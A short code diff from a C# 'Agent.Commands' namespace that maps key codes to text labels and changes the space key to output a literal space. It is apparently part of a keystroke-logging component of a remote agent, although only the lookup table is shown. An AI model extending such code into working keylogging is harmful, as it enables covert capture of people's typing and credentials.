@@ -141,7 +141,7 @@ namespace Agent.Commands
             else if (code == 19) key = "[Pause]";
             else if (code == 20) key = "[Caps Lock]";
             else if (code == 27) key = "[Esc]";
-            else if (code == 32) key = "[Space]";
+            else if (code == 32) key = " ";
             else if (code == 33) key = "[Page Up]";
             else if (code == 34) key = "[Page Down]";
             else if (code == 35) key = "[End]";
